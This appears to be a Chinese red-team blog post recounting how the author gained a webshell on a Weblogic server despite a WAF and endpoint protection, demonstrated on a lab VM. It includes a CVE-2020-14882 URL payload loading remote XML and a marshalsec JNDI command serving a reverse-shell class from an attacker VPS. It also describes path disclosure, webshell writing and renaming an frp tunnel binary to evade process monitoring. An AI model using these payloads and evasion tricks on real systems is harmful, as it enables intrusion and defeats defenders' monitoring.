<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/78Y1nFiYt9QjP7BkX6yPSw)

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcaA8wBFW4icTiaL7ELd8ia04Olh40TBx7CquHZyCicicl4eYJno2y0oZ0H4A/640?wx_fmt=png)

 **Part1 前言** 

大家好，我是 ABC_123。前两期分享了《第 14 篇：Struts2 框架下 Log4j2 漏洞检测方法分析与总结》、《第 15 篇：内网横向中 windows 各端口远程登录哈希传递的方法总结》，本期讲解一个 Weblogic 拿权限案例。

最近安服的同事打比赛，给我陆续发了好几个没有拿下来的 Weblogic 的站点，一直在想尽各种办法研究，争取拿下权限。各种 WAF 防护、终端防护、不出网、SUID 不一致、EXP 没回显等等原因，造成了现有工具、EXP 都没法利用，难度都挺大的。接下来分享一个实战案例，**一个 Weblogic 站点，T3、IIOP 协议都关闭**。我粗略看了一下，初步判断是有 waf 及终端防护在，绕过的过程还是曲折的，于是把过程记录下来，分享给大家，为了防止打码不全造成项目信息泄露，我还是拿一个虚拟机环境做演示吧，但是思路都是完整的。

 **Part2 技术研究过程** 

*   **Web****logic 中间件判断**
    

打开 weblogic 站点，输入一个不存在的路径，服务器返回如下，证明是 Weblogic 中间件。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDxtPaRqEchMARWPg4q9XADQDZUQJKhyZsr039e4ibeDU1sMlDslcUbdA/640?wx_fmt=png)

后续经过扫描探测发现 T3、IIOP 协议同时关闭了，仅限 HTTP 访问。于是回想了一下，Weblogic 在 HTTP 下大致有以下几个可以拿权限的漏洞，我把相关漏洞 CVE 罗列出来：

*   **筛选 Weblogic HTTP 下可用的 EXP**
    -----------------------------
    

经过一系列筛选，经过 ABC_123 总结，Webloigc 中间件下 HTTP 可拿权限的漏洞大致有如下几个，其中 CVE-2020-14882 权限绕过漏洞，后续又接连出了好几个绕过方法，这里就不一一列举了。

**CVE-2014-4210 weblogic SSRF 漏洞**。很老的一个漏洞了，可以通过打内网的 redis 匿名访问漏洞拿权限。  

**CVE-2018-2894 两处路径上传漏洞**。/ws_utc/begin.do，/ws_utc/config.do，其中 **begin.do 在开发模式下无需认证，在生产模式下需要认证**。

**CVE-2018-3252 DeploymentService 接口上传漏洞**。需要用户名密码，**打补丁后，可以判断用户名密码是否存在，但是无法上传文件成功**。

**CVE-2020-14882 权限绕过代码执行漏洞。**可以回显执行命令结果，可以结合 jndi 出网利用，可以加载 xml 文件任意代码执行

**CVE-2017-3506 代码执行漏洞**。XMLDecoder 反序列化不安全数据造成代码执行

**CVE-2017-10271 代码执行漏洞**。XMLDecoder 反序列化不安全数据造成代码执行

**CVE-2019-2725 代码执行漏洞**。XMLDecoder 反序列化不安全数据造成代码执行

**CVE-2019-2729 代码执行漏洞**。Weblogic10.3.6 与 12.1.3 的 POC 构造不一样, Weblogic 12.1.3 版本 2729 的不出网 POC，目前无人公布在网上，**网传的 POC 仅适用于 JDK1.6 Weblogic10.3.6 版本情况，原理是 <array method="forName"> 标签替换**，适用范围有限。

**CVE-2021-2109 权限绕过漏洞**。利用方式 jndi，利用成功的前提条件有 2 个：1、需要出网；2、**JDK 版本小于等于 JDK1.8.191**。

对于这几个漏洞的判断和利用，是很麻烦的：比如说 CVE-2019-2725、CVE-2019-2729、CVE-2020-14756 等的各种 exp 变形非常非常多，JDK1.6、JDK1.7、JDK1.8 不同 JDK 下 exp 均有不同，然后有的可以过 waf、有的不能；有的可以回显，有的却回显不成功；有的 exp 路径存在，有的不存在等等。总之，各种情况下 exp 数量太多了，挨个测试非常麻烦。于是我写了一个**简单的 FUZZ 工具，起一个线程池，把所有组合的 exp 通通尝试一遍**，每个 exp 的发包请求、发包返回都会被记录，而且还内置了浏览器，这样可以仔细分析每个 exp 利用成功或者失败的原因，大家可以自己用 python 脚本实现一个，很简单。

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDhxSt4kjwkhTXxWLaMicAbXPFtic63Rox0kWQzB4aGibWibCvkSIkg4SNPA/640?wx_fmt=jpeg)

最终经过筛选，发现只有两个 exp 可用，而且成功绕过了各种防护。

 **1**   **CVE-2019-2729 的 JNDI 出网利用**

这是其中一个能用的 EXP，同时也意味着 CVE-2017-10271、CVE-2019-2725 漏洞均被打了补丁了，不能用，而且 weblogic 版本大致是 12.1.3。而且服务器装的 JDK 需要是 <=JDK 1.8.191 才能利用成功。

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtD8043ZDQpibyxAg8bwE8cnqiaQWkCibEHpKeukpLDUiayKqsr8kXmVkcZMw/640?wx_fmt=jpeg)

 **2**  **CVE-2020-14882 后台绕过及 jndi 出网利用**

这个 exp 能用挺好的，基本上拿下权限是百分之百的事情，因为 222.xml 里面可以加载任意 java 代码，而且不用考虑 JDK 版本问题。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDDU4TyyeSvSEOgsx7rmJhQWkzicUxg1TQKIPD1cgq8pQvyMheLQaTX8A/640?wx_fmt=png)

*   **CVE-2020-14882 漏洞的尝试**
    ------------------------
    

这个漏洞大体利用先前的权限绕过，发起一个 jndi 请求，检测 POC 大致如下图所示：

http://192.168.237.235:7130/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("%68%74%74%70%3a%2f%2xxx.xxx.xxx.xxx:53/123.xml")

首先验证一下漏洞可不可用，将上述 URL 中的 xml 远程地址替换成 dnslog 地址，dnslog 地址有返回，证明漏洞存在且 EXP 可用。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtD0ZsibMrCLIY2x7A4Rgw3VeKYIgABZZlzKWib9PoTuGcicVegmEicWx8KVA/640?wx_fmt=png)

接下来将 123.xml 文件中的命令替换成 ping dnslog.cn 的命令，结果发现 dnslog 没有返回，证明没有成功。。。这是什么情况。。。一顿操作没有找到问题所在。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDd0qxq09BMYlmjQEjblnqoNYN1puZCibsNCOrMFKFKGvoSSDHfDysSzQ/640?wx_fmt=png)

*   **CVE-2019-2729 的 JNDI 尝试**
    ---------------------------
    

接下来就把目光放在 CVE-2019-2729 这个 JNDI 的 exp 上了，首先编写一个实现了反弹 shell 功能的 MyEvilClass.java 文件，从 ysoserial 的 github 上摘抄了一个反弹 shell 的 java 代码，编译成 MyEvilClass 文件，用老外的神器 marshalsec-0.0.3-SNAPSHOT-all.jar 搭建起来，使用命令如下：

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://vpsIP:8888/#MyEvilClass" 53

MyEvilClass.java 大致内容如下：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDZXpyeoIDCLAkWibRSxzKLurJIHdcROJepa4OXUK6cg4gbPtJRgwK5aw/640?wx_fmt=png)

结果让人崩溃，这次反弹 shell 成功了，但是只要执行命令，反弹的 shell 就会断掉。提示 “isn’t allowed to be executed”

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDIhiaZV0F9nSiadiaseRiboEpAyotYXtYwP6weIKTAboicvc938r79c6bBrA/640?wx_fmt=png)

太难了。。。估计有什么终端防护在上面。。接下来怎么办呢，没思路了，啥命令都执行不了。

*   **换个思路拿下权限**
    ------------
    

后来我想了想，终端防护拦截的是 CMD 执行命令、拦截进程等操作，现在的攻击对象是 Java 反序列化漏洞，**为啥不从 Java 代码层面上考虑问题呢**？用 Java 代码中的 PrintWriter 类去写入一个 Webshell 就行了，终端防护总不能连正常的 java 类写文件操作都拦截吧。但是一个问题又来了，如何知道网站的绝对路径呢？看如下操作：

正常的漏洞路径如下：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDpy5KYkoxzSAeG4NgFBwoRKeicXfjanSuEvVDh9m7icjyb06Q6cwCsBUg/640?wx_fmt=png)

在上述 URL 路径后面加上一个**?info** 可以直接得到网站的绝对路径（看下图的右下角）

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDxe37Sl72NxZLVVbYVvrM9UCGZlM6P7kyx2UPzCaWOoZ404uMLCDqAg/640?wx_fmt=png)

将上述网站绝对路径放到 MyEvilClass.java 文件中，完成一个写文件的操作。关键代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450AXibBXGrdBaa4PBaYu4XPtDATCUZJZaKOVHiaFVXSz4C5LUKDSPFvzmFSiczmq0fr93Hr6icP5REJWYg/640?wx_fmt=png)

JNDI 请求发起后，写文件的 java 代码被执行，webshell 成功拿下。

*   **绕过进程监控**
    ----------
    

接下来就是上传 FRP 或者 dogtunnel 架设 Socks5 代理了，结果还是遇到了麻烦。经过一系列测试，发现在 / tmp 目录下，任何新建进程都会在 1 分钟左右被终止掉、新建文件都会被删掉。执行 ps -aux 命令发现有 **process monitor** 字样的进程名存在。

后续绕过方法很简单，我在 weblogic 的 domain 目录下，传一个 frp，将程序名字更改为 weblogic 或者 tomcat。哈哈，进程拦截不拦截了，估计也不敢拦截，怕终止正常的 weblogic 或者 tomcat 应用。

 **Part3 总结** 

**1.** 遇到终端防护拦截执行命令的情况，不如换个思路，从 java 代码层面上考虑，它总不能连 PrintWriter 类写文件的正常操作都拦截吧。

**2.** 那些公布出来的 Nday，也是有利用价值的，可以多研究一下漏洞原理和利用技巧。

**3.** **/_async/AsyncResponseService?info**  可以直接获取 Weblogic 的绝对路径。此外，Weblogic 还有很多有意思的东西可以挖，很多地方都可以获取绝对路径。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等

每周一篇，99% 原创，敬请关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rhn137KeqqlDkuRyY4G61jATRzyOrCBts8ucxkLpMNsYutSOY7BkPziaw/640?wx_fmt=jpeg)

**往期精彩回顾**

[第 15 篇：内网横向中 windows 各端口远程登录哈希传递的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484255&idx=1&sn=e233aa07fdf9de0c8a1bf56fb0954766&chksm=c25fcc24f5284532c5aa27c002d15aa6380c456e2a84299c77b8d43a41892517087258bf867d&scene=21#wechat_redirect)

[第 14 篇：Struts2 框架下 Log4j2 漏洞检测方法分析与总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484207&idx=1&sn=285b54a79e48db9a05816cab2e6afc27&chksm=c25fcc54f5284542c1b9abe870e0caa9f958f4da90723bd83292deed215c63c705b7b0bbfaff&scene=21#wechat_redirect)  

[第 13 篇：coldfusion 反序列化过 waf 改 exp 拿靶标的艰难过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484191&idx=1&sn=cce12f62b3cf457bc73753b77a083695&chksm=c25fcc64f528457250b11ef6804ee6138c37ed87ab988874cc84d09d04fa6ac1fd36b5e8aa4a&scene=21#wechat_redirect)  

[第 12 篇：给任意 java 程序挂 Socks5 代理方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484173&idx=1&sn=e2d454d2447d119bf771a0a511fba994&chksm=c25fcc76f5284560d00355590da0147aca7b7ae2275c095424034245ef32b3d0b28e49c2dbc9&scene=21#wechat_redirect)  

[第 11 篇：盲猜包体对上传漏洞的艰难利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484162&idx=1&sn=870596fcd1120a6d3ee9688c38aace00&chksm=c25fcc79f528456f9dc0a3b9d9cf54422696a1cd6ffd737ae2c6e33941a25c33d4f6d32fc663&scene=21#wechat_redirect)  

[第 10 篇：IIS 短文件名猜解在拿权限中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484145&idx=1&sn=7635430b9b759a2cacdd2c57ba330833&chksm=c25fcd8af528449c1f5c6c703e3668cf6a8dae875ee82ffa67caed66722a0751e3d80d8a6bee&scene=21#wechat_redirect)  

[第 9 篇：Shiro 反序列化数据包解密及蓝队分析工具，提供下载](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484123&idx=1&sn=cb9c039ef92311e56e7742c7c38f6e8a&chksm=c25fcda0f52844b6088b39b769a63b2f6e7a29e8b3ab710961918218d7569089ee4e00072ad9&scene=21#wechat_redirect)  

[第 8 篇：Oracle 注入漏洞绕 waf 的新语句](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484115&idx=1&sn=10c73343ec23f522696692293cd38852&chksm=c25fcda8f52844be2165aa6151c7ad018a4add748673d56523631529e903277633dc44d0abba&scene=21#wechat_redirect)  

[第 7 篇：MS12-020 蓝屏漏洞在实战中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484105&idx=1&sn=3aeafa9c172588aaaade47ccacb69370&chksm=c25fcdb2f52844a4a783fceec590c9e12eb06f62dabd7fbffb37e8da23053953a7eae296048d&scene=21#wechat_redirect)  

[第 6 篇：Weblogic 反序列化攻击不依赖日志溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484094&idx=1&sn=527236759dc4fd228461195197492507&chksm=c25fcdc5f52844d36bffb96979116d6d3a9ae4fb1a0f320436c7275aea271588c702cea60e5c&scene=21#wechat_redirect)  

[第 5 篇：Shiro Padding Oracle 无 key 的艰难实战利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484091&idx=1&sn=4dcce59a842f17035d0018bf650671ae&chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&scene=21#wechat_redirect)  

[第 4 篇：jsp 型 webshell 被删情况下如何溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484004&idx=1&sn=50013b50e48542d156700d76ccbd2f33&chksm=c25fcd1ff528440906bb9089a807c16b747ab5a72cc0279a3c0d18a265cd76cc796df570d594&scene=21#wechat_redirect)  

[第 3 篇：银行 Java 站 SSRF"组合洞" 打法造成的严重危害](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483984&idx=1&sn=1a018fcefe10124c1726e51a2be05ca7&chksm=c25fcd2bf528443d944a8495ca5c72d8c028fef67de217efe47a8d18b077ae24556842687407&scene=21#wechat_redirect)  

[第 2 篇：区分 Spring 与 Struts2 框架的几种新方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483951&idx=1&sn=fbc1d04ef73a449238a5979a439b1f35&chksm=c25fcd54f528444219f20c2ab14c5970c243fbb10ba04b5bccc0fb0b7cc6d3f542e26f7870bf&scene=21#wechat_redirect)  

[第 1 篇：weblogic9.x 在 JDK1.5 下 T3 反序列化漏洞利用方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483867&idx=1&sn=e0fcaa9f1b58c8085ccd9dc6f74ed336&chksm=c25fcea0f52847b6aeec0409e3290e023b890d603361f103315b39637f89a10dd6fe051dc724&scene=21#wechat_redirect)